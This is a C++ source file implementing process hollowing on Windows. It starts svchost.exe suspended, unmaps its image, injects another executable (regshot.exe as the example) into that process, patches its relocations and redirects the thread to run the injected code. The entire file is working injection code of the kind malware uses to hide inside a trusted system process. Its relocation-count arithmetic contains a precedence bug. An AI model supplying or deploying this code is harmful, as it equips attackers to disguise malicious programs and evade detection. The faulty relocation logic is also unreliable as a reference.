/**
* Resources:
* https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations#code
* https://medium.com/cyber-unbound/process-replacement-a-k-a-process-hollowing-38d012a7facb
* https://www.codeproject.com/Articles/19685/Get-Process-Info-with-NtQueryInformationProcess
* https://gist.github.com/hugsy/f60ca6f01839bb56e3cc1ffa0b4e2f75
* 
*/
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include "NtDllFuncs.h"

typedef struct BASE_RELOCATION_BLOCK {
        DWORD PageAddress;
        DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
        USHORT Offset : 12;
        USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

int main(int argc, char **argv) {
    // prepare environment for obtaining process information
    LPSTARTUPINFOA startupInfo = new STARTUPINFOA();  // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    LPPROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();  // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    PROCESS_BASIC_INFORMATION *pprocessBasicInformation = new PROCESS_BASIC_INFORMATION();  // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess
    DWORD retLen = 0;
    HMODULE hNtDll = sm_LoadNTDLLFunctions();
    if (!hNtDll) {
        std::cerr << "Couldn't load ntdll" << std::endl;
        return 1;
    }

    // run host process (process to be hollowed out)
    // the process has to be suspended
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
    CreateProcessA(NULL, (LPSTR)"svchost.exe", NULL, NULL, TRUE,
                   CREATE_SUSPENDED, NULL, NULL, startupInfo, processInformation);

    // now store a handle to this process
    HANDLE hostProc = processInformation->hProcess;

    // begin the hollowing
    // get host proc imageBase offset
    // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess
    gNtQueryInformationProcess(hostProc, ProcessBasicInformation,
                              pprocessBasicInformation,
                              sizeof(PROCESS_BASIC_INFORMATION), &retLen);

    // now we have the address of PEB,
    // the ImageBaseAddress is 8 bytes away from the PEB
    DWORD PEBImageBaseOffset = (DWORD)pprocessBasicInformation->PebBaseAddress + 8;
    LPVOID hostImageBase = 0;
    SIZE_T bytesRead = NULL;
    ReadProcessMemory(hostProc, (LPCVOID)PEBImageBaseOffset, &hostImageBase, 4, &bytesRead);  // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory

    // prepare the payload to be placed in the hollowed process
    // this can be any entry point, regshot is done for the sake of example
    HANDLE payload = CreateFileA("C:\\Temp\\regshot\\regshot.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
    DWORD payloadSize = GetFileSize(payload, NULL);
    LPDWORD payloadBytesRead = 0;
    LPVOID payloadBytesBuff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadSize);
    ReadFile(payload, payloadBytesBuff, payloadSize, NULL, NULL);

    PIMAGE_DOS_HEADER payloadImageDosHeader = (PIMAGE_DOS_HEADER)payloadBytesBuff;
    PIMAGE_NT_HEADERS payloadImageNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)payloadBytesBuff + payloadImageDosHeader->e_lfanew);
    SIZE_T payloadImageSize = payloadImageNtHeaders->OptionalHeader.SizeOfImage;

    // begin the hollowing
    // remove the memory of the host process
    gNtUnmapViewOfSection(hostProc, hostImageBase);

    // allocate memory in the host image for the payload image
    LPVOID newHostImageBase = VirtualAllocEx(hostProc, hostImageBase, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    hostImageBase = newHostImageBase;

    // calc difference between payload base address and host base address
    DWORD diffImageBase = (DWORD)hostImageBase - payloadImageNtHeaders->OptionalHeader.ImageBase;

    // set the payload image base
    payloadImageNtHeaders->OptionalHeader.ImageBase = (DWORD)hostImageBase;

    // copy the payload headers to the host image
    WriteProcessMemory(hostProc, newHostImageBase, payloadBytesBuff, payloadImageNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

    // obtain pointer to payload image section
    PIMAGE_SECTION_HEADER payloadImageSection = (PIMAGE_SECTION_HEADER)((DWORD)payloadBytesBuff + payloadImageDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
    PIMAGE_SECTION_HEADER payloadImageSectionOld = payloadImageSection;

    int err = GetLastError();

    // copy the payload to the host process memory
    for (int i = 0; i < payloadImageNtHeaders->FileHeader.NumberOfSections; i++) {
        PVOID hostSectionloc = (PVOID)((DWORD)hostImageBase + payloadImageSection->VirtualAddress);
        PVOID payloadSectionLoc = (PVOID)((DWORD)payloadBytesBuff + payloadImageSection->PointerToRawData);

        WriteProcessMemory(hostProc, hostSectionloc, payloadSectionLoc, payloadImageSection->SizeOfRawData, NULL);

        payloadImageSection++;
    }

    // get address of relocation table
    IMAGE_DATA_DIRECTORY relocTable = payloadImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    // patch the binary with relocations
    payloadImageSection = payloadImageSectionOld;

    for (int i = 0; i < payloadImageNtHeaders->FileHeader.NumberOfSections; i++) {
        BYTE* relocSecName = (BYTE*)".reloc";

        if (memcmp(payloadImageSection->Name, relocSecName, 5)) {
            payloadImageSection++;
            continue;
        }

        DWORD payloadRelocTableRaw = payloadImageSection->PointerToRawData;
        DWORD relocOffset = 0;

        while (relocOffset < relocTable.Size) {
            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD) payloadBytesBuff + payloadRelocTableRaw + relocOffset);

            relocOffset += sizeof(BASE_RELOCATION_BLOCK);
            DWORD relocCnt = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK) / sizeof(BASE_RELOCATION_ENTRY));

            PBASE_RELOCATION_ENTRY relocEntries = (PBASE_RELOCATION_ENTRY)((DWORD)payloadBytesBuff + payloadRelocTableRaw + relocOffset);

            for (DWORD y = 0; y < relocCnt; y++) {
                relocOffset += sizeof(BASE_RELOCATION_ENTRY);

                if (relocEntries[y].Type == 0) {
                    continue;
                }

                DWORD patchAddr = relocationBlock->PageAddress + relocEntries[y].Offset;
                DWORD patchBuffer = 0;

                ReadProcessMemory(hostProc, (LPCVOID)((DWORD)hostImageBase + patchAddr), &patchBuffer, sizeof(DWORD), &bytesRead); 

                patchBuffer += diffImageBase;

                WriteProcessMemory(hostProc, (PVOID)((DWORD)hostImageBase + patchAddr), &patchBuffer, sizeof(DWORD), payloadBytesRead);

            }

        }

    }

    LPCONTEXT context = new CONTEXT();
    context->ContextFlags = CONTEXT_INTEGER;

    GetThreadContext(processInformation->hThread, context);

    DWORD patchEntryPoint = (DWORD)hostImageBase + payloadImageNtHeaders->OptionalHeader.AddressOfEntryPoint;

    context->Eax = patchEntryPoint;

    SetThreadContext(processInformation->hThread, context);

    ResumeThread(processInformation->hThread);


    if (hNtDll) {
        FreeLibrary(hNtDll);
    }

    return 0;
}
